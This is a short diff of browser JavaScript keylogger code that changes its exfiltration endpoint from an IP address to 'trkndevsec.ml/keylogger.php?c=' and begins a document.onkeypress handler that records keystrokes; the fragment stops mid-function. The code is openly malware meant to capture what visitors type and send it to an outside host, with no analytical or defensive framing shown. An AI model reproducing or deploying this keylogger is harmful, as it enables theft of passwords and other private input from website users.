@@ -1,5 +1,5 @@
 var keys='';
-var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';
+var url = 'http://trkndevsec.ml/keylogger.php?c=';
 
 document.onkeypress = function(e) {
 	get = window.event?event:e;
